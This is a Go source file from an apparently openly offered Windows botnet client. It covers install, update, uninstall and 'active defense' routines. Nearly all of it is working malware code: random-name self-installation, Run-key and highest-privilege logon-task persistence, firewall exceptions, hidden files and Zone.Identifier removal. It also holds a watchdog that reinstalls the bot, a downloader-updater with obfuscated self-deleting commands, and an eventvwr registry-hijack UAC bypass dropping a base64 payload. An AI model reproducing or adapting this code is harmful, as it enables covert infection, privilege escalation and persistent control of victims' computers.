//Handles Install, Uninstall and Active Security Functions

//TODO
//Work on Uninstall
//Work on Persistence and Active Security
//Campaign targeting System (Detect region and compair to list whitelist)
//Find (non-Admin) folder option other then APPDATA/ROAMING
//Work on WatchDog (Make it check the files HASH and compair it to itself to make sure it isnt tapered with and its actoully the master/Dog.
//Add more UAC Bypass Options
//Use API for Process Scanning, Kill blacklisted processes
//Randomize times for Active Scurity and WatchDog (Help detection)
//Have AD and WD Check to make sure the Registry values haven't been tamperd with... Compair to memory

//Registry Keys to Make! (Information should be encoded/encrypted for security)
//ID = UUID (Bots)
//INSTALL = Install Date and Time (UTC)
//NAME = Bots exe Name
//PETNAME = WatchDog Name
//REMASTER = New C&C Panels
//LAST = Last known command
package components

import (
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	//"strings"
	"syscall"
	"time"

	"github.com/StackExchange/wmi"
	"golang.org/x/sys/windows/registry"
)

var myInstall string = tmpPath
var myAdminInstall string = winDirPath
var myTime = time.Now().Format(time.RFC850)

//============================================================
//                   Userkit Install and Uninstall
//============================================================
func install() {
	rand.Seed(time.Now().UTC().UnixNano())
	var myInstallName = installNames[rand.Intn(len(installNames))]
	var myRegistryName = registryNames[rand.Intn(len(registryNames))]

	myInstallReg = myRegistryName
	myName = myInstallName
	if campaignMode { //Is this a campain bot?
		if maxMindWork(0) { //Valid campaing area
			if activeDefense {
				_ = copyFileToDirectory(os.Args[0], myInstall+watchdogName+".exe") //WatchDog Program
			}
			if isAdmin { //Got Admin rights!
				//Clone bot to new home
				cmd := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], myAdminInstall+myInstallName+".exe")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = cmd.Output()
				//Remove Zone Identifier
				_ = os.Remove(myAdminInstall + myInstallName + deobfuscate("/fyf;[pof/Jefoujgjfs"))
				//Create Task to bypass UAC on user login
				cmd1 := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, myAdminInstall+myInstallName+".exe", "HKLM\\"+runPath+"\\"+myInstallName)
				CommandWork := exec.Command("cmd", "/C", cmd1)
				CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = CommandWork.Output()
				//Add to Firewall
				if autofirwall {
					if addtoFirewall(myInstallName, os.Args[0]) {
					}
				}
				//Handle Bot Regigtry
				cmd2 := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+myRegistryName, "/f")
				cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = cmd2.Output()
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "ID", obfuscate(myUID))
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "INSTALL", myTime)
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "NAME", obfuscate(myInstallName))
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "VERSION", clientVersion)
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "REMASTER", "nil")
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "LAST", "")

				//Hide the bot
				fileStealth(myAdminInstall + myInstallName + ".exe")
			} else { //No Admin rights
				//Copy bot to new home
				cmd3 := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], myInstall+myInstallName+".exe")
				cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = cmd3.Output()
				//Remove Zone Identifier
				_ = os.Remove(myInstall + myInstallName + deobfuscate("/fyf;[pof/Jefoujgjfs"))
				//Add to startup
				_ = writeRegistryKey(registry.CURRENT_USER, runPath, myInstallName, myInstall+myInstallName+".exe")
				//Handle Bot Regigtry
				cmd4 := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+myRegistryName, "/f")
				cmd4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = cmd4.Output()
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "ID", obfuscate(myUID))
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "INSTALL", myTime)
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "NAME", obfuscate(myInstallName))
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "VERSION", clientVersion)
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "REMASTER", "nil")
				_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "LAST", "")
				//Hide the bot
				fileStealth(myInstall + myInstallName + ".exe")
			}
		}
	} else { //Guess not.
		if activeDefense {
			_ = copyFileToDirectory(os.Args[0], myInstall+watchdogName+".exe") //WatchDog Program
		}
		if isAdmin { //Got Admin rights!
			//Clone bot to new home
			cmd := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], myAdminInstall+myInstallName+".exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = cmd.Output()
			//Remove Zone Identifier
			_ = os.Remove(myAdminInstall + myInstallName + deobfuscate("/fyf;[pof/Jefoujgjfs"))
			//Create Task to bypass UAC on user login
			cmd1 := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, myAdminInstall+myInstallName+".exe", "HKLM\\"+runPath+"\\"+myInstallName)
			CommandWork := exec.Command("cmd", "/C", cmd1)
			CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = CommandWork.Output()
			//Add to Firewall
			if autofirwall {
				if addtoFirewall(myInstallName, os.Args[0]) {
				}
			}
			//Handle Bot Regigtry
			cmd2 := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+myRegistryName, "/f")
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = cmd2.Output()
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "ID", obfuscate(myUID))
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "INSTALL", myTime)
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "NAME", obfuscate(myInstallName))
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "VERSION", clientVersion)
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "REMASTER", "nil")
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "LAST", "")
			//Hide the bot
			fileStealth(myAdminInstall + myInstallName + ".exe")
		} else { //No Admin rights
			//Copy bot to new home
			cmd3 := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], myInstall+myInstallName+".exe")
			cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = cmd3.Output()
			//Remove Zone Identifier
			_ = os.Remove(myInstall + myInstallName + deobfuscate("/fyf;[pof/Jefoujgjfs"))
			//Add to startup
			_ = writeRegistryKey(registry.CURRENT_USER, runPath, myInstallName, myInstall+myInstallName+".exe")
			//Handle Bot Regigtry
			cmd4 := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+myRegistryName, "/f")
			cmd4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = cmd4.Output()
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "ID", obfuscate(myUID))
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "INSTALL", myTime)
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "NAME", obfuscate(myInstallName))
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "VERSION", clientVersion)
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "REMASTER", "nil")
			_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "LAST", "")
			//Hide the bot
			fileStealth(myInstall + myInstallName + ".exe")
		}
	}
	if activeDefense {
		_ = writeRegistryKey(registry.CURRENT_USER, runPath, watchdogName, myInstall+watchdogName+".exe")
	}
}

func update(version, file, md5 string) { //Version, File URL, File MD5 ( update("ArchNun", "http://www.filehost.com/gobot.upt", "false") )
	if version != clientVersion {
		var myPath string
		if isAdmin {
			myPath = myAdminInstall
		} else {
			myPath = myInstall
		}

		n := randomString(5, false)
		output, _ := os.Create(tmpPath + n + ".exe")
		defer output.Close()
		response, _ := http.Get(file)
		defer response.Body.Close()
		_, err := io.Copy(output, response.Body)
		if err != nil {
		}
		//Remove the Zone ID
		_ = os.Remove(tmpPath + n + ".exe" + deobfuscate("/fyf;[pof/Jefoujgjfs"))

		if md5 != "false" {
			if string(computeMD5(tmpPath+n+"."+n)) == md5 {
				//Disable Defense
				activeDefense = false
				kill(watchdogName + ".exe")
				//Remove old
				goodbye := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0]) //4000
				goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				goodbye.Start()
				//Move new from temp to install area with install name
				movenew := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5161!?!Ovm!'!npwf!0Z!")+tmpPath+n+".exe "+myPath+myName+".exe") //4050
				movenew.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				movenew.Start()
				os.Exit(0)
			}
		} else {
			//Disable Defense
			activeDefense = false
			kill(watchdogName + ".exe")
			//Remove old
			goodbye := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0]) //4000
			goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			goodbye.Start()
			//Move new from temp to install area with install name
			movenew := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5161!?!Ovm!'!npwf!0Z!")+tmpPath+n+".exe "+myPath+myName+".exe") //4050
			movenew.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			movenew.Start()
			os.Exit(0)
		}
	}
}

func uninstall() {
	_, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\", myInstallReg)
	if err != nil {
	} else {
		editHost("", true)
		activeDefense = false
		kill(watchdogName + ".exe")
		goodbyedog := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+myInstall+watchdogName+".exe")
		goodbyedog.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		goodbyedog.Start()
		_ = deleteRegistryKey(registry.CURRENT_USER, runPath, myName)
		_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\", myInstallReg)
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableTaskMgr", "0")       //0 = on|1 = off
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableRegistryTools", "0") //0 = on|1 = off
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableCMD", "0")           //0 = on|1 = off
		rmtask := exec.Command("cmd", "/Q", "/C", `SchTasks /Delete /TN `+"HKLM\\"+runPath+"\\"+myName)
		rmtask.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		rmtask.Start()
		//Delete event logs
		goodbye := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0])
		goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		goodbye.Start()
		os.Exit(0)
	}
}

//============================================================
//                   Userkit Active Defense
//============================================================
func runActiveDefense() {
	for activeDefense {
		time.Sleep(time.Duration(randInt(75, 250)) * time.Millisecond)
		//Check to see if WatchDog is running
		//Copy self to some location and have run as watchdog, Add to startup, and check if watchdog is running
		if isAdmin {
			if !checkFileExist(myAdminInstall + myName + ".exe") { //Not found, Fix it.
				cmd := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], myAdminInstall+myName+".exe")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = cmd.Output()
			}

			cmd := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, myAdminInstall+myName+".exe", "HKLM\\"+runPath+"\\"+myName)
			CommandWork := exec.Command("cmd", "/C", cmd)
			CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = CommandWork.Output()

			fileStealth(myAdminInstall + myName + ".exe")

			if autofirwall {
				if addtoFirewall(myName, os.Args[0]) {
				}
			}

		} else {
			if !checkFileExist(myInstall + myName + ".exe") { //Not found, Fix it.
				cmd := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], myInstall+myName+".exe")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = cmd.Output()
			}
			_ = writeRegistryKey(registry.CURRENT_USER, runPath, myName, myInstall+myName+".exe")

			fileStealth(myInstall + myName + ".exe")

		}

		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "ID", obfuscate(myUID))
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "INSTALL", myTime)
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "NAME", obfuscate(myName))
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "VERSION", clientVersion)
		//WatchDog Stuff

		_ = writeRegistryKey(registry.CURRENT_USER, runPath, watchdogName, myInstall+watchdogName+".exe")
		fileStealth(myInstall + watchdogName + ".exe")
		//val, _, path := checkForAnotherMe()
		//if !val || !strings.Contains(path, watchdogName) { //Doggy not found, Fix it.
		//	run("start " + myInstall + watchdogName + ".exe")
		//}
		if !checkFileExist(myInstall + watchdogName + ".exe") {
			_ = copyFileToDirectory(os.Args[0], myInstall+watchdogName+".exe") //WatchDog Program
		}
		ine := checkForProc(watchdogName)
		if !ine {
			run("start " + myInstall + watchdogName + ".exe")
		}
	}
}

func watchDog() { //Not in use, Come back to check later.
	for { //Bark
		time.Sleep(time.Duration(randInt(75, 250)) * time.Millisecond)
		val := checkForProc(myName)
		if !val { //Not found, Get Master!!!!
			if isAdmin {
				if !checkFileExist(myAdminInstall + myName + ".exe") { //
					_ = copyFileToDirectory(os.Args[0], myAdminInstall+myName+".exe")

					fileStealth(myAdminInstall + myName + ".exe")

					cmd1 := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, myAdminInstall+myName+".exe", "HKLM\\"+runPath+"\\"+myName)
					CommandWork := exec.Command("cmd", "/C", cmd1)
					CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					_, _ = CommandWork.Output()

					if autofirwall {
						if addtoFirewall(myName, os.Args[0]) {
						}
					}
				}
				ine := checkForProc(myName)
				if !ine {
					run("start " + myAdminInstall + myName + ".exe")
				}
			} else {
				if !checkFileExist(myInstall + myName + ".exe") {
					_ = copyFileToDirectory(os.Args[0], myInstall+myName+".exe")

					fileStealth(myInstall + myName + ".exe")

					_ = writeRegistryKey(registry.CURRENT_USER, runPath, myName, myInstall+myName+".exe")
				}
				ine := checkForProc(myName)
				if !ine {
					run("start " + myInstall + myName + ".exe")
				}
			}
		}
	}
}

//============================================================
//                   Userkit Tools
//============================================================
func fileStealth(file string) {
	run("attrib +S +H " + file) //attrib -s -h -r /s /d
}

func checkForAnotherMe() (bool, string, string) { //Scans Processes to see if any match its MD5 HASH (Returns Ifexists, name, path)
	var dst []Win32_Process
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		return false, "", ""
	}
	for _, v := range dst {
		if string(computeMD5(*v.ExecutablePath)) == string(computeMD5(os.Args[0])) {
			if *v.ExecutablePath != os.Args[0] {
				return true, v.Name, *v.ExecutablePath
			}
		}
	}
	return false, "", ""
}

func uacBypass(file string) bool {
	n := randomString(5, false)
	Binary, _ := os.Create(tmpPath + n + ".exe")
	DecodedBinary, _ := base64.StdEncoding.DecodeString(file)
	Binary.WriteString(string(DecodedBinary))
	Binary.Close()
	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", bypassPath, "/d", tmpPath+n+".exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
		return false
	}
	c := exec.Command("cmd", "/C", "eventvwr.exe")
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
		return false
	}
	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", bypassPathAlt, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return false
	}
	return true
}
